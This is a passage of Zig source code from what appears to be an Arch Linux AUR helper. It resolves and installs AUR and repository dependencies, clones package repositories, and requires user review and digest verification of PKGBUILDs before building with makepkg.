            for (plan.dependencies.repo.items) |dependency| {
                try appendTransactionPackage(&packages, allocator, .{
                    .name = dependency.name,
                    .repository = "Repository",
                    .source = .repository,
                    .role = transactionRole(dependency.role),
                });
            }
            for (plan.dependencies.aur.items) |*dependency| {
                try appendTransactionPackage(&packages, allocator, .{
                    .name = dependency.prepared.package_name,
                    .version = try dependency.prepared.info.get_full_version(allocator),
                    .repository = "AUR",
                    .package_base = dependency.prepared.package_base,
                    .revision = dependency.prepared.target_commit,
                    .source = .aur,
                    .role = transactionRole(dependency.role),
                });
            }

            for (plan.selected_optional orelse &.{}) |raw| {
                const parsed = dependency_resolver.parseOptionalDependency(raw);
                const name_z = try allocator.dupeZ(u8, parsed.name);
                const repository_name = self.alpm.find_remote_satisfier_for_dependency(name_z) catch null;
                try appendTransactionPackage(&packages, allocator, .{
                    .name = repository_name orelse parsed.name,
                    .repository = if (repository_name != null) "Repository" else "AUR",
                    .source = if (repository_name != null) .repository else .aur,
                    .role = .optional_dependency,
                });
            }
        }

        var answer = try operation.ask(.{
            .kind = .confirm_transaction,
            .prompt = "Proceed with AUR package installation?",
            .transaction_plan = .{
                .action = .install,
                .packages = packages.items,
            },
            .default_response = .accepted,
        });
        defer answer.deinit(self.allocator);
        if (answer.response == .accepted) return;

        operation.context.cancel();
        return error.Cancelled;
    }

    pub fn removePackages(
        self: *Self,
        package_names: []const []const u8,
        flags: TransFlag,
        remove_optional_dependencies: bool,
    ) !void {
        var operation_scope = OperationScope.init(self, .remove, if (package_names.len == 0) null else package_names[0]);
        operation_scope.attach();
        defer operation_scope.finish(.success);
        errdefer operation_scope.fail();
        try self.checkCancelled();
        try self.removeRepoPackages(package_names, flags, !remove_optional_dependencies);
        for (package_names) |package_name| {
            self.vcs_store.remove(package_name);
            const package_base = try self.resolvePkgbase(package_name);
            const cache_path = try self.cachePath(package_base);
            defer self.allocator.free(cache_path);
            _ = self.removeCacheDirectory(cache_path) catch false;
        }
        try self.vcs_store.saveFile(self.io(), self.vcs_store_path);
    }

    pub fn installPackageVersion(self: *Self, package_name: []const u8, commit: []const u8) !void {
        var operation_scope = OperationScope.init(self, .install, package_name);
        operation_scope.attach();
        defer operation_scope.finish(.success);
        errdefer operation_scope.fail();
        try self.checkCancelled();
        self.raisePackageProgress(.aur_download_start, package_name, 1, 1, "");
        var prepared = try self.preparePackageForBuild(package_name, commit);
        defer prepared.deinit(self.allocator);
        self.raisePackageProgress(.aur_download_done, package_name, 1, 1, "");
        try self.alpm.sync(false);
        const build_only = try dependency_resolver.collectBuildOnlyDependencies(self.allocator, &prepared.info, self.no_check, self.dependencyBackend());
        defer builder.deinitPaths(self.allocator, build_only);
        var collection = DependencyCollection.init(self.allocator);
        defer collection.deinit();
        var visited = std.StringHashMap(void).init(self.allocator);
        defer {
            var keys = visited.keyIterator();
            while (keys.next()) |key| self.allocator.free(key.*);
            visited.deinit();
        }
        try visited.put(try self.allocator.dupe(u8, prepared.package_base), {});
        try self.collectDependenciesRecursive(&prepared.info, &collection, &visited);
        try self.requirePkgbuildApproval(&prepared);
        try self.requireDependencyApprovals(&collection);
        try self.installCollection(&collection);
        self.raisePackageProgress(.aur_build_start, package_name, 1, 1, "Building package with makepkg");
        if (!(try self.buildPreparedPackage(&prepared, true))) {
            self.raisePackageProgress(.aur_package_failed, package_name, 1, 1, "Failed to build package with makepkg");
            return error.BuildFailed;
        }
        self.raisePackageProgress(.aur_build_done, package_name, 1, 1, "");
        const package_files = try self.selectBuiltPackageFiles(prepared.cache_path, &.{package_name});
        defer builder.deinitPaths(self.allocator, package_files);
        if (package_files.len == 0) {
            self.raisePackageProgress(.aur_package_failed, package_name, 1, 1, "No matching package files produced by makepkg");
            return error.NoBuiltPackages;
        }
        self.raisePackageProgress(.aur_install_start, package_name, 1, 1, "");
        const install_paths: []const []const u8 = @ptrCast(package_files);
        try self.alpm.install_local_packages(install_paths, .{});
        self.raisePackageProgress(.aur_install_done, package_name, 1, 1, "");
        if (build_only.len > 0) {
            self.raisePackageProgress(.aur_cleanup_start, package_name, 1, 1, "Removing build-only dependencies");
            const build_names: []const []const u8 = @ptrCast(build_only);
            self.removeRepoPackages(build_names, .{}, true) catch {};
            self.raisePackageProgress(.aur_cleanup_done, package_name, 1, 1, "");
        }
        self.raisePackageProgress(.aur_package_completed, package_name, 1, 1, "");
    }

    fn dependencyBackend(self: *Self) dependency_resolver.Backend {
        return .{
            .context = self,
            .is_installed = dependencyIsInstalled,
            .find_repo_satisfier = dependencyRepoSatisfier,
        };
    }

    fn dependencyIsInstalled(context: ?*anyopaque, dependency: [:0]const u8) bool {
        const self: *Self = @ptrCast(@alignCast(context));
        return self.alpm.is_dependency_satisfied_by_installed_packages(dependency) catch false;
    }

    fn dependencyRepoSatisfier(context: ?*anyopaque, dependency: [:0]const u8) ?[]const u8 {
        const self: *Self = @ptrCast(@alignCast(context));
        return self.alpm.find_remote_satisfier_for_dependency(dependency) catch null;
    }

    fn collectDependenciesRecursive(
        self: *Self,
        info: *const PkgbuildInfo,
        collection: *DependencyCollection,
        visited: *std.StringHashMap(void),
    ) !void {
        var resolution = try dependency_resolver.resolve(self.allocator, info, self.no_check, self.dependencyBackend());
        defer resolution.deinit(self.allocator);
        for (resolution.repo_packages) |dependency|
            try collection.addRepo(dependency.name, dependency.role);
        for (resolution.aur_packages) |dependency| {
            var preferred = try self.preferBinaryVariant(dependency.dependency);
            defer preferred.deinit(self.allocator);
            var prepared = self.preparePackageForBuild(preferred.name, null) catch |err| switch (err) {
                error.DownloadFailed => blk: {
                    const providers = self.aur_client.findProviders(preferred.name) catch continue;
                    defer rpc.deinitStrings(self.allocator, providers);
                    if (providers.len == 0) continue;
                    const chosen = self.chooseProvider(preferred.name, providers) orelse continue;
                    preferred.deinit(self.allocator);
                    preferred = try dependency_resolver.cloneDependency(self.allocator, dependency.dependency);
                    self.allocator.free(preferred.name);
                    preferred.name = try self.allocator.dupe(u8, chosen);
                    break :blk try self.preparePackageForBuild(preferred.name, null);
                },
                else => return err,
            };
            var prepared_live = true;
            defer if (prepared_live) prepared.deinit(self.allocator);
            if (visited.contains(prepared.package_base)) continue;
            try visited.put(try self.allocator.dupe(u8, prepared.package_base), {});
            if (preferred.operator.len != 0) {
                const child_version = try prepared.info.get_full_version(self.allocator);
                defer self.allocator.free(child_version);
                if (!(try version.satisfies(self.allocator, child_version, preferred.operator, preferred.version))) continue;
            }
            try self.collectDependenciesRecursive(&prepared.info, collection, visited);
            try collection.addAur(&prepared, dependency.role);
            prepared_live = false;
        }
    }

    fn installCollection(self: *Self, collection: *const DependencyCollection) !void {
        if (collection.repo.items.len > 0) {
            const names = try self.allocator.alloc([]const u8, collection.repo.items.len);
            defer self.allocator.free(names);
            for (collection.repo.items, names) |dependency, *name| name.* = dependency.name;
            try self.installRepoPackagesConst(names, .{ .alldeps = true });
        }
        for (collection.aur.items) |*dependency|
            try self.buildAndInstallDependency(&dependency.prepared);
    }

    fn buildAndInstallDependency(self: *Self, dependency: *PreparedPackage) !void {
        if (self.currently_installing_dependencies.contains(dependency.package_base)) return;
        const key = try self.allocator.dupe(u8, dependency.package_base);
        try self.currently_installing_dependencies.put(key, {});
        defer {
            _ = self.currently_installing_dependencies.remove(dependency.package_base);
            self.allocator.free(key);
        }
        self.raisePackageProgress(.aur_build_start, dependency.package_name, 1, 1, "Building AUR dependency with makepkg");
        if (!(try self.buildPreparedPackage(dependency, false))) {
            self.raisePackageProgress(.aur_package_failed, dependency.package_name, 1, 1, "Failed to build AUR dependency with makepkg");
            return error.BuildFailed;
        }
        self.raisePackageProgress(.aur_build_done, dependency.package_name, 1, 1, "");
        const cache_path = if (std.ascii.eqlIgnoreCase(self.makepkg_config.package_destination, "/home/packages")) dependency.cache_path else self.makepkg_config.package_destination;
        const files = try self.selectBuiltPackageFiles(cache_path, &.{dependency.package_name});
        defer builder.deinitPaths(self.allocator, files);
        if (files.len == 0) {
            self.raisePackageProgress(.aur_package_failed, dependency.package_name, 1, 1, "No matching package files produced for AUR dependency");
            return error.NoBuiltPackages;
        }
        self.raisePackageProgress(.aur_install_start, dependency.package_name, 1, 1, "Installing AUR dependency");
        const install_paths: []const []const u8 = @ptrCast(files);
        try self.alpm.install_local_packages(install_paths, .{ .alldeps = true });
        self.raisePackageProgress(.aur_install_done, dependency.package_name, 1, 1, "");
        self.raisePackageProgress(.aur_package_completed, dependency.package_name, 1, 1, "");
    }

    fn installRepoPackages(self: *Self, names: []const []u8, flags: TransFlag) !void {
        const values: []const []const u8 = @ptrCast(names);
        try self.installRepoPackagesConst(values, flags);
    }

    fn installRepoPackagesConst(self: *Self, names: []const []const u8, flags: TransFlag) !void {
        var terminated: std.ArrayList([:0]const u8) = .empty;
        defer {
            for (terminated.items) |name| self.allocator.free(name);
            terminated.deinit(self.allocator);
        }
        for (names) |name| try terminated.append(self.allocator, try self.allocator.dupeZ(u8, name));
        try self.alpm.install_packages(terminated.items, flags);
    }

    fn removeRepoPackages(self: *Self, names: []const []const u8, flags: TransFlag, keep_optional_dependencies: bool) !void {
        var terminated: std.ArrayList([:0]const u8) = .empty;
        defer {
            for (terminated.items) |name| self.allocator.free(name);
            terminated.deinit(self.allocator);
        }
        for (names) |name| try terminated.append(self.allocator, try self.allocator.dupeZ(u8, name));
        try self.alpm.remove_packages(terminated.items, flags, keep_optional_dependencies);
    }

    fn selectOptionalDependencies(self: *Self, info: *const PkgbuildInfo) ![][]const u8 {
        if (self.skip_optional_dependency_prompt) return self.allocator.alloc([]const u8, 0);
        const raw_options = info.opt_depends orelse return self.allocator.alloc([]const u8, 0);
        var options: std.ArrayList(events.ProviderOption) = .empty;
        defer options.deinit(self.allocator);
        for (raw_options) |raw| {
            const parsed = dependency_resolver.parseOptionalDependency(raw);
            if (!dependency_resolver.isValidPackageName(parsed.name)) continue;
            const name_z = try self.allocator.dupeZ(u8, parsed.name);
            defer self.allocator.free(name_z);
            try options.append(self.allocator, .{
                .name = parsed.name,
                .description = parsed.description,
                .is_installed = self.alpm.is_package_installed(name_z),
            });
        }
        if (options.items.len == 0) return self.allocator.alloc([]const u8, 0);
        const response = self.dispatcher.ask(.{
            .question_type = .select_optional_dependencies,
            .question = "Select optional dependencies",
            .options = options.items,
        });
        var selected: std.ArrayList([]const u8) = .empty;
        errdefer selected.deinit(self.allocator);
        for (response.selected_indices) |index| {
            if (index >= options.items.len or options.items[index].is_installed) continue;
            try selected.append(self.allocator, options.items[index].name);
        }
        return selected.toOwnedSlice(self.allocator);
    }

    fn installSelectedOptionalDependencies(self: *Self, parent: []const u8, selected: []const []const u8) anyerror!void {
        var repo_names: std.ArrayList([]const u8) = .empty;
        defer repo_names.deinit(self.allocator);
        var aur_names: std.ArrayList([]const u8) = .empty;
        defer aur_names.deinit(self.allocator);
        for (selected) |raw| {
            const parsed = dependency_resolver.parseOptionalDependency(raw);
            const name_z = try self.allocator.dupeZ(u8, parsed.name);
            defer self.allocator.free(name_z);
            if (self.alpm.find_remote_satisfier_for_dependency(name_z)) |satisfier| {
                if (!containsConst(repo_names.items, satisfier)) try repo_names.append(self.allocator, satisfier);
            } else |_| if (!containsConst(aur_names.items, parsed.name)) try aur_names.append(self.allocator, parsed.name);
        }
        if (repo_names.items.len > 0) {
            self.raiseBuildLine(parent, "Installing optional dependencies from repositories", false);
            if (self.installRepoPackagesConst(repo_names.items, .{})) |_| {
                for (repo_names.items) |name| {
                    const name_z = try self.allocator.dupeZ(u8, name);
                    defer self.allocator.free(name_z);
                    self.alpm.update_package_reason(name_z, .Dependency) catch {};
                }
            } else |err| {
                self.raiseBestEffortFailure(parent, "Failed to install repository optional dependencies", err);
            }
        }
        const previous = self.skip_optional_dependency_prompt;
        self.skip_optional_dependency_prompt = true;
        defer self.skip_optional_dependency_prompt = previous;
        for (aur_names.items) |name| {
            const providers = self.aur_client.findProviders(name) catch continue;
            defer rpc.deinitStrings(self.allocator, providers);
            const chosen = self.chooseProvider(name, providers) orelse {
                const message = try std.fmt.allocPrint(self.allocator, "Optional dependency '{s}' has no selected AUR provider", .{name});
                defer self.allocator.free(message);
                self.dispatcher.raiseError(.{ .message = message });
                continue;
            };
            self.installPackages(&.{chosen}) catch continue;
            const chosen_z = try self.allocator.dupeZ(u8, chosen);
            defer self.allocator.free(chosen_z);
            self.alpm.update_package_reason(chosen_z, .Dependency) catch {};
        }
    }

    fn chooseProvider(self: *Self, dependency: []const u8, provider_names: []const []u8) ?[]const u8 {
        if (provider_names.len == 0) return null;
        if (provider_names.len == 1) return provider_names[0];
        var options: std.ArrayList(events.ProviderOption) = .empty;
        defer options.deinit(self.allocator);
        for (provider_names) |name| {
            const name_z = self.allocator.dupeZ(u8, name) catch continue;
            defer self.allocator.free(name_z);
            options.append(self.allocator, .{
                .name = name,
                .description = "No Description",
                .is_installed = self.alpm.is_package_installed(name_z),
            }) catch continue;
        }
        const response = self.dispatcher.ask(.{
            .question_type = .select_provider,
            .question = "Select an AUR provider",
            .options = options.items,
            .dependency_name = dependency,
        });
        const index = if (response.selected_indices.len > 0) response.selected_indices[0] else 0;
        return if (index < provider_names.len) provider_names[index] else provider_names[0];
    }

    fn preparePackageForBuild(
        self: *Self,
        package_name: []const u8,
        historical_commit: ?[]const u8,
    ) !PreparedPackage {
        try self.checkCancelled();
        const resolved_base = try self.resolvePkgbase(package_name);
        const package_base = try self.allocator.dupe(u8, resolved_base);
        errdefer self.allocator.free(package_base);
        const owned_name = try self.allocator.dupe(u8, package_name);
        errdefer self.allocator.free(owned_name);
        const cache_path = try self.cachePath(package_base);
        errdefer self.allocator.free(cache_path);
        const pkgbuild_path = try std.fs.path.join(self.allocator, &.{ cache_path, "PKGBUILD" });
        errdefer self.allocator.free(pkgbuild_path);

        const old_pkgbuild = std.Io.Dir.cwd().readFileAlloc(
            self.io(),
            pkgbuild_path,
            self.allocator,
            .limited(max_file_size),
        ) catch try self.allocator.alloc(u8, 0);
        errdefer self.allocator.free(old_pkgbuild);
        const previous_commit = self.readCheckoutCommit(cache_path) catch try self.allocator.alloc(u8, 0);
        errdefer self.allocator.free(previous_commit);

        const downloaded = if (historical_commit) |commit|
            try self.downloadPackageAtCommit(package_name, commit)
        else
            try self.downloadPackage(package_name);
        if (!downloaded) return error.DownloadFailed;

        const target_commit = try self.readCheckoutCommit(cache_path);
        errdefer self.allocator.free(target_commit);
        const new_pkgbuild = try std.Io.Dir.cwd().readFileAlloc(
            self.io(),
            pkgbuild_path,
            self.allocator,
            .limited(max_file_size),
        );
        errdefer self.allocator.free(new_pkgbuild);

        var info = try (pkgbuild_parser.PkgbuildParser{
            .allocator = self.allocator,
            .io = self.io(),
            .selected_package_name = package_name,
        }).parser(pkgbuild_path);
        errdefer info.deinit(self.allocator);
        try requireReviewInputs(self.allocator, self.io(), cache_path, &info);

        var validation_results = try validatePkgbuildInfo(self.allocator, self.io(), &info, cache_path, new_pkgbuild);
        errdefer validation_results.deinit(self.allocator);
        const digest = try reviewDigest(self.allocator, self.io(), cache_path, new_pkgbuild, &info);

        return .{
            .package_name = owned_name,
            .package_base = package_base,
            .cache_path = cache_path,
            .pkgbuild_path = pkgbuild_path,
            .previous_commit = previous_commit,
            .target_commit = target_commit,
            .old_pkgbuild = old_pkgbuild,
            .new_pkgbuild = new_pkgbuild,
            .digest = digest,
            .info = info,
            .validation_results = validation_results,
        };
    }

    fn requirePkgbuildApproval(self: *Self, prepared: *const PreparedPackage) !void {
        if (self.approved_pkgbuild_reviews.get(prepared.package_base)) |review| {
            if (std.mem.eql(u8, review.commit, prepared.target_commit) and
                std.mem.eql(u8, &review.digest, &prepared.digest)) return;
        }

        const findings = try prepared.validation_results.flatten(self.allocator);
        defer self.allocator.free(findings);
        const approved = try self.resolvePkgbuildApproval(self.pkgbuild_approval_handler, .{
            .package_name = prepared.package_name,
            .old_pkgbuild = prepared.old_pkgbuild,
            .new_pkgbuild = prepared.new_pkgbuild,
            .warnings = findings,
            .source_files = &prepared.info.local_source_contents,
        });
        if (!approved) return error.PkgbuildReviewDeclined;
        try self.rememberApprovedReview(
            prepared.package_base,
            prepared.target_commit,
            prepared.digest,
        );
    }

    fn resolvePkgbuildApproval(
        self: *Self,
        legacy_handler: ?PkgbuildApprovalHandler,
        request: PkgbuildDiffRequest,
    ) !bool {
        if (self.dispatcher.operation) |operation| {
            if (!operation.context.hasQuestionHandler()) {
                if (legacy_handler) |handler| return handler.function(handler.data, request);
                return error.MissingPkgbuildReviewHandler;
            }
            var source_files: std.ArrayList(operation_api.QuestionAttachment) = .empty;
            defer source_files.deinit(self.allocator);
            var source_iterator = request.source_files.iterator();
            while (source_iterator.next()) |entry| try source_files.append(self.allocator, .{
                .name = entry.key_ptr.*,
                .content = entry.value_ptr.*,
            });

            const review_findings = try self.allocator.alloc(operation_api.ReviewFinding, request.warnings.len);
            defer self.allocator.free(review_findings);
            for (request.warnings, review_findings) |finding, *review_finding| review_finding.* = .{
                .tool = finding.tool,
                .severity = switch (finding.severity) {
                    .info => .info,
                    .warning => .warning,
                    .critical => .critical,
                },
                .hook = finding.hook,
                .matched_line = finding.matched_line,
                .message = finding.message,
            };

            const prompt = try std.fmt.allocPrint(self.allocator, "Proceed with update to {s}?", .{request.package_name});
            defer self.allocator.free(prompt);

            var answer = try operation.ask(.{
                .kind = .review_changes,
                .prompt = prompt,
                .review = .{
                    .subject = request.package_name,
                    .old_content = request.old_pkgbuild,
                    .new_content = request.new_pkgbuild,
                    .findings = review_findings,
                    .related_files = source_files.items,
                },
                .default_response = if (request.warnings.len == 0) .accepted else .declined,
            });
            defer answer.deinit(self.allocator);
            switch (answer.response) {
                .accepted => return true,
                .declined => return false,
                else => {},
            }
        }
        if (legacy_handler) |handler| return handler.function(handler.data, request);
        return error.MissingPkgbuildReviewHandler;
    }

    fn rememberApprovedReview(
        self: *Self,
        package_base: []const u8,
        commit: []const u8,
        digest: [std.crypto.hash.sha2.Sha256.digest_length]u8,
    ) !void {
        if (self.approved_pkgbuild_reviews.fetchRemove(package_base)) |old| {
            self.allocator.free(old.key);
            self.allocator.free(old.value.commit);
        }
        const owned_base = try self.allocator.dupe(u8, package_base);
        errdefer self.allocator.free(owned_base);
        const owned_commit = try self.allocator.dupe(u8, commit);
        errdefer self.allocator.free(owned_commit);
        try self.approved_pkgbuild_reviews.put(owned_base, .{
            .commit = owned_commit,
            .digest = digest,
        });
    }

    fn readCheckoutCommit(self: *Self, cache_path: []const u8) ![]u8 {
        var result = try self.runAsInvokingUser(&.{ "git", "-C", cache_path, "rev-parse", "HEAD" }, null, null);
        defer result.deinit(self.allocator);
        if (result.exit_code != 0) return error.InvalidAurCheckout;
        const commit = std.mem.trim(u8, result.stdout, " \t\r\n");
        if (commit.len == 0) return error.InvalidAurCheckout;
        return self.allocator.dupe(u8, commit);
    }

    fn verifyPreparedPackage(self: *Self, prepared: *const PreparedPackage) !void {
        const commit = try self.readCheckoutCommit(prepared.cache_path);
        defer self.allocator.free(commit);
        if (!std.mem.eql(u8, commit, prepared.target_commit)) return error.ReviewedCheckoutChanged;
        const pkgbuild = try std.Io.Dir.cwd().readFileAlloc(
            self.io(),
            prepared.pkgbuild_path,
            self.allocator,
            .limited(max_file_size),
        );
        defer self.allocator.free(pkgbuild);
        const digest = try reviewDigest(self.allocator, self.io(), prepared.cache_path, pkgbuild, &prepared.info);
        if (!std.mem.eql(u8, &digest, &prepared.digest)) return error.ReviewedCheckoutChanged;
    }

    /// The only entry point from a prepared checkout into makepkg. Keeping the
    /// approval and integrity checks adjacent prevents callers from accidentally
    /// building content that was declined or changed after it was reviewed.
    fn buildPreparedPackage(self: *Self, prepared: *const PreparedPackage, historical: bool) !bool {
        try self.requirePkgbuildApproval(prepared);
        try self.verifyPreparedPackage(prepared);
        return self.buildPackage(prepared.package_name, prepared.cache_path, historical);
    }

    fn readCachedPkgbuild(self: *Self, package_name: []const u8) !?[]u8 {
        const package_base = try self.resolvePkgbase(package_name);
        const primary_dir = try self.cachePath(package_base);
        defer self.allocator.free(primary_dir);
        const primary = try std.fs.path.join(self.allocator, &.{ primary_dir, "PKGBUILD" });
        defer self.allocator.free(primary);
        if (std.Io.Dir.cwd().readFileAlloc(self.io(), primary, self.allocator, .limited(max_file_size))) |content| return content else |_| {}
        const legacy_dir = try self.cachePath(package_name);
        defer self.allocator.free(legacy_dir);
        const legacy = try std.fs.path.join(self.allocator, &.{ legacy_dir, "PKGBUILD" });
        defer self.allocator.free(legacy);
        return std.Io.Dir.cwd().readFileAlloc(self.io(), legacy, self.allocator, .limited(max_file_size)) catch null;
    }

    fn resolvePkgbase(self: *Self, package_name: []const u8) ![]const u8 {
        if (std.mem.trim(u8, package_name, " \t\r\n").len == 0) return package_name;
        if (self.pkgbase_cache.get(package_name)) |cached| return cached;
        if (try self.tryResolveFromSrcinfo(package_name)) |package_base| {
            defer self.allocator.free(package_base);
            return self.cachePkgbase(package_name, package_base);
        }
        if (try self.tryResolveFromGitRemote(package_name)) |package_base| {
            defer self.allocator.free(package_base);
            return self.cachePkgbase(package_name, package_base);
        }
        const remote = self.aur_client.getPackageBase(package_name) catch return self.cachePkgbase(package_name, package_name);
        defer self.allocator.free(remote);
        return self.cachePkgbase(package_name, remote);
    }

    fn cachePkgbase(self: *Self, package_name: []const u8, package_base: []const u8) ![]const u8 {
        const key = try self.allocator.dupe(u8, package_name);
        errdefer self.allocator.free(key);
        const value = try self.allocator.dupe(u8, package_base);
        errdefer self.allocator.free(value);
        try self.pkgbase_cache.put(key, value);
        return value;
    }

    fn tryResolveFromSrcinfo(self: *Self, package_name: []const u8) !?[]u8 {
        const direct_dir = try self.cachePath(package_name);
        defer self.allocator.free(direct_dir);
        const direct = try std.fs.path.join(self.allocator, &.{ direct_dir, ".SRCINFO" });
        defer self.allocator.free(direct);
        if (srcinfo.parseFile(self.allocator, self.io(), direct)) |info_value| {
            var info = info_value;
            defer info.deinit(self.allocator);
            if (info.contains(package_name) and info.package_base != null)
                return @as(?[]u8, try self.allocator.dupe(u8, info.package_base.?));
        } else |_| {}

        var root = std.Io.Dir.cwd().openDir(self.io(), self.cache_root, .{ .iterate = true }) catch return null;
        defer root.close(self.io());
        var iterator = root.iterate();
        while (try iterator.next(self.io())) |entry| {
            if (entry.kind != .directory) continue;
            const path = try std.fs.path.join(self.allocator, &.{ self.cache_root, entry.name, ".SRCINFO" });
            defer self.allocator.free(path);
            var info = srcinfo.parseFile(self.allocator, self.io(), path) catch continue;
            defer info.deinit(self.allocator);
            if (info.contains(package_name) and info.package_base != null)
                return @as(?[]u8, try self.allocator.dupe(u8, info.package_base.?));
        }
        return null;
    }

    fn tryResolveFromGitRemote(self: *Self, package_name: []const u8) !?[]u8 {
        const directory = try self.cachePath(package_name);
        defer self.allocator.free(directory);
        const git_directory = try std.fs.path.join(self.allocator, &.{ directory, ".git" });
        defer self.allocator.free(git_directory);
        _ = std.Io.Dir.cwd().statFile(self.io(), git_directory, .{}) catch return null;
        var result = try self.runAsInvokingUser(&.{ "git", "-C", directory, "remote", "get-url", "origin" }, null, null);
        defer result.deinit(self.allocator);
        if (result.exit_code != 0) return null;
        return parseAurGitRemote(self.allocator, std.mem.trim(u8, result.stdout, " \t\r\n"));
    }

    fn downloadPackage(self: *Self, package_name: []const u8) !bool {
        const package_base = try self.resolvePkgbase(package_name);
        const cache_path = try self.cachePath(package_base);
        defer self.allocator.free(cache_path);
        const expected_remote = try std.fmt.allocPrint(
            self.allocator,
            "{s}/{s}.git",
            .{ self.aur_git_base_url, package_base },
        );
        defer self.allocator.free(expected_remote);
        const git_dir = try std.fs.path.join(self.allocator, &.{ cache_path, ".git" });
        defer self.allocator.free(git_dir);
        var clone_needed = true;
        if (std.Io.Dir.cwd().statFile(self.io(), git_dir, .{})) |_| {
            var remote = try self.runAsInvokingUser(&.{ "git", "-C", cache_path, "remote", "get-url", "origin" }, null, null);
            defer remote.deinit(self.allocator);
            if (remote.exit_code == 0 and std.mem.eql(u8, std.mem.trim(u8, remote.stdout, " \t\r\n"), expected_remote)) {
                var pull = try self.runAsInvokingUser(&.{ "git", "-C", cache_path, "pull", "--ff-only" }, null, null);
                defer pull.deinit(self.allocator);
                clone_needed = pull.exit_code != 0;
            }
        } else |_| {}
        if (clone_needed) {
            self.cleanBuildArtifacts(cache_path);
            if (!(try self.removeCacheDirectory(cache_path))) return false;
            var clone = try self.runAsInvokingUser(&.{ "git", "clone", expected_remote, cache_path }, null, null);
            defer clone.deinit(self.allocator);
            if (clone.exit_code != 0) return false;
        }
        const pkgbuild_path = try std.fs.path.join(self.allocator, &.{ cache_path, "PKGBUILD" });
        defer self.allocator.free(pkgbuild_path);
        _ = std.Io.Dir.cwd().statFile(self.io(), pkgbuild_path, .{}) catch return false;
        return true;
    }

    fn downloadPackageAtCommit(self: *Self, package_name: []const u8, commit: []const u8) !bool {
        const package_base = try self.resolvePkgbase(package_name);
        const cache_path = try self.cachePath(package_base);
        defer self.allocator.free(cache_path);
        const remote = try std.fmt.allocPrint(
            self.allocator,
            "{s}/{s}.git",
            .{ self.aur_git_base_url, package_base },
        );
        defer self.allocator.free(remote);
        if (!(try self.removeCacheDirectory(cache_path))) return false;
        var clone = try self.runAsInvokingUser(&.{ "git", "clone", remote, cache_path }, null, null);
        defer clone.deinit(self.allocator);
        if (clone.exit_code != 0) return false;
        var checkout = try self.runAsInvokingUser(&.{ "git", "checkout", commit }, cache_path, null);
        defer checkout.deinit(self.allocator);
        if (checkout.exit_code != 0) return false;
        const pkgbuild_path = try std.fs.path.join(self.allocator, &.{ cache_path, "PKGBUILD" });
        defer self.allocator.free(pkgbuild_path);
        _ = std.Io.Dir.cwd().statFile(self.io(), pkgbuild_path, .{}) catch return false;
        return true;
    }

    fn prepareBuildDirectory(self: *Self, cache_path: []const u8) !void {
        const pkgbuild_path = try std.fs.path.join(self.allocator, &.{ cache_path, "PKGBUILD" });
        defer self.allocator.free(pkgbuild_path);
        if (std.Io.Dir.cwd().statFile(self.io(), pkgbuild_path, .{})) |_| {
            const previous_versions = try std.fs.path.join(self.allocator, &.{ cache_path, "PreviousVersions" });
            defer self.allocator.free(previous_versions);
            var mkdir = try self.runAsInvokingUser(&.{ "mkdir", "-p", previous_versions }, null, null);
            defer mkdir.deinit(self.allocator);
            if (mkdir.exit_code == 0) {
                var backup_count: usize = 0;
                if (std.Io.Dir.cwd().openDir(self.io(), previous_versions, .{ .iterate = true })) |directory_value| {
                    var directory = directory_value;
                    defer directory.close(self.io());
                    var iterator = directory.iterate();
                    while (try iterator.next(self.io())) |entry| {
                        if (entry.kind == .file and std.mem.startsWith(u8, entry.name, "PKGBUILD.")) backup_count += 1;
                    }
                } else |_| {}
                const backup_name = try std.fmt.allocPrint(self.allocator, "PKGBUILD.{d}", .{backup_count + 1});
                defer self.allocator.free(backup_name);
                const backup_path = try std.fs.path.join(self.allocator, &.{ previous_versions, backup_name });
                defer self.allocator.free(backup_path);
                var copy = try self.runAsInvokingUser(&.{ "cp", pkgbuild_path, backup_path }, null, null);
                defer copy.deinit(self.allocator);
            }
        } else |_| {}

        var directory = std.Io.Dir.cwd().openDir(self.io(), cache_path, .{ .iterate = true }) catch return;
        defer directory.close(self.io());
        var iterator = directory.iterate();
        var stale_paths: std.ArrayList([]u8) = .empty;
        defer {
            for (stale_paths.items) |path| self.allocator.free(path);
            stale_paths.deinit(self.allocator);
        }
        while (try iterator.next(self.io())) |entry| {
            if (entry.kind != .file or !builder.isPackageArchiveArtifact(entry.name)) continue;
            try stale_paths.append(self.allocator, try std.fs.path.join(self.allocator, &.{ cache_path, entry.name }));
        }
        for (stale_paths.items) |path| {
            var remove = try self.runAsInvokingUser(&.{ "rm", "-f", path }, null, null);
            remove.deinit(self.allocator);
        }
    }

    fn selectBuiltPackageFiles(
        self: *Self,
        cache_path: []const u8,
        requested_names: []const []const u8,
    ) ![][]u8 {
        const srcinfo_path = try std.fs.path.join(self.allocator, &.{ cache_path, ".SRCINFO" });
        defer self.allocator.free(srcinfo_path);
        if (srcinfo.parseFile(self.allocator, self.io(), srcinfo_path)) |info_value| {
            var info = info_value;
            defer info.deinit(self.allocator);
            const package_names: []const []const u8 = @ptrCast(info.package_names);
            return builder.selectBuiltPackageFilesForNames(
                self.allocator,
                self.io(),
                cache_path,
                requested_names,
                package_names,
            );
        } else |_| {
            return builder.selectBuiltPackageFilesForNames(
                self.allocator,
                self.io(),
                cache_path,
                requested_names,
                requested_names,
            );
        }
    }

    fn cleanBuildArtifacts(self: *Self, cache_path: []const u8) void {
        for ([_][]const u8{ "src", "pkg" }) |name| {
            const path = std.fs.path.join(self.allocator, &.{ cache_path, name }) catch continue;
            defer self.allocator.free(path);
            _ = std.Io.Dir.cwd().statFile(self.io(), path, .{}) catch continue;
            if (self.removeCacheDirectory(path) catch false) continue;
            const message = std.fmt.allocPrint(self.allocator, "Failed to clean build artifact directory {s}", .{path}) catch continue;
            defer self.allocator.free(message);
            self.raiseInfo(.debug_output, null, message, null, null);
        }
    }

    fn removeCacheDirectory(self: *Self, path: []const u8) !bool {
        _ = std.Io.Dir.cwd().statFile(self.io(), path, .{}) catch return true;
        if (self.runAsInvokingUser(&.{ "rm", "-rf", path }, null, null)) |result_value| {
            var result = result_value;
            defer result.deinit(self.allocator);
            if (result.exit_code == 0) return true;
        } else |_| {}

        var fallback = try builder.runWithEnvironment(
            self.allocator,
            self.io(),
            self.environ,
            &.{ "rm", "-rf", path },
            null,
            null,
        );
        defer fallback.deinit(self.allocator);
        return fallback.exit_code == 0;
    }

    fn buildPackage(self: *Self, package_name: []const u8, cache_path: []const u8, historical: bool) !bool {
        if (self.use_chroot) try self.ensureChrootExists();
        var command = if (self.makepkg_command) |command_path|
